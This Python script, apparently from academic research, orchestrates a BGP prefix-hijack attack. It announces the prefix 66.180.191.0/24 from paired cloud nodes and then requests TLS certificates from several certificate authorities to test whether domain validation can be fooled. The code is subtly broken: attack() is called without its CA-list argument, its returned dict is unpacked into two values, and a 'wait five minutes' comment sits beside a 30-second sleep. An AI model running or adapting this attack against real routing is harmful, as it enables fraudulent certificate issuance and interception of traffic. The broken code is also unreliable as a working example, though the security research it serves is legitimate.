#!/usr/bin/env python3
import requests
import re
import os
import sys
import time
import textwrap
import random
import datetime
import subprocess
import json
from bgp_pathfinder.pathfinder import main as pathfinder
from bgp_pathfinder.send_cmd import main as send_cmd
from bgp_pathfinder.engines.vultr import copy_file_from_node_name as copy_file
from cert_req_constructor import CertificateRequestFactory as CertReqFactory
from utils.node import Node

dir_path = os.path.dirname(os.path.realpath(__file__)) 


def attack(ca_list, node_a: Node, node_b: Node):
  args = ["-d", node_a.name,  node_b.name, "-i", "66.180.191.0/24"]
  pathfinder(["-w"])  # make announcments-- equivalent of calling pathfinder from command line with above args
  pathfinder(args)    # make announcments-- equivalent of calling pathfinder from command line with above args

  # wait five minutes
  time.sleep(30)
  
  start = time.time()
  
  with open(f"{dir_path}/results/http.log", 'a') as file:
      file.write(f"{node_a.name}, {node_b.name}:\n")
  
  attack_results = {}
  for ca in ca_list:
    attack_results[ca] = {}
    cert_req =CertReqFactory.create(ca, node_a, node_b)
    token = cert_req.send_request()
    attack_results[ca][node_a.name], attack_results[ca][node_b.name] = cert_req.get_results(token)


  end = time.time()
  print("Total time for all attacks between this pair of nodes= ", end-start)
  
  return attack_results

if __name__ == "__main__":
  script_dir = os.path.dirname(os.path.abspath(__file__))

  # check correct number of arguments
  if len(sys.argv)==1: 
    print("Please add arguments.")
    exit()
  if len(sys.argv)%2 == 0: #script call throws off by 1
    print("Number of args must be even. Number is", len(sys.argv)-1)
    exit()

  # for each pair
  for i in range(0, len(sys.argv)//2): 
    node_a = sys.argv[2*i+1]
    node_b = sys.argv[2*i+2]
    start = time.time()
    node_a_ips, node_b_ips = attack(node_a, node_b)
    end = time.time()
    print("Total attack time = ", end-start)
    
    

# [1] currently run at main bc it's set up with everything. Once this entire module is downloaded to a server fully fitted with certbot 
# and everything, can run certbot command locally. technically each cert has different requirements for request to be run: cf uses curl,
# so it actually can be run anywhere, let's encrypt uses certbot so it needs that, google requires gcloud sign-in. 



